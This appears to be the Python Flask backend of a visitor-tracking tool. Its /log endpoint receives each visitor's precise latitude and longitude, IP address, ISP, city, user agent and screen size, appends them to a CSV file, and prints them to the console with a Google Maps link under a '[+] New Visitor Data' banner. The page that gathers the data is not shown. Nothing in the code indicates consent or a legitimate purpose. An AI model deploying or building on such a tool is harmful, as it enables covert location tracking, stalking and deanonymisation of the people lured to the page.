from flask import Flask, render_template, request
from colorama import Fore, Style, init
import csv

init(autoreset=True)
app = Flask(__name__)

def print_fancy(data):
    print(Fore.YELLOW + "\n[+] New Visitor Data:")
    print(Fore.GREEN + f"    IP        : {data.get('ip')}")
    print(Fore.GREEN + f"    City      : {data.get('city')}")
    print(Fore.GREEN + f"    Country   : {data.get('country')}")
    print(Fore.GREEN + f"    Lat, Lon  : {data.get('latitude')}, {data.get('longitude')}")
    print(Fore.GREEN + f"    Map Link  : https://www.google.com/maps?q={data.get('latitude')},{data.get('longitude')}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json()
    with open('results.csv', 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([
            data.get('latitude'),
            data.get('longitude'),
            data.get('accuracy'),
            data.get('ip'),
            data.get('city'),
            data.get('region'),
            data.get('country'),
            data.get('isp'),
            data.get('userAgent'),
            data.get('screen'),
            data.get('mapsUrl')
        ])
    print_fancy(data)  # Print directly when POST is received
    return 'Logged', 200

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080)
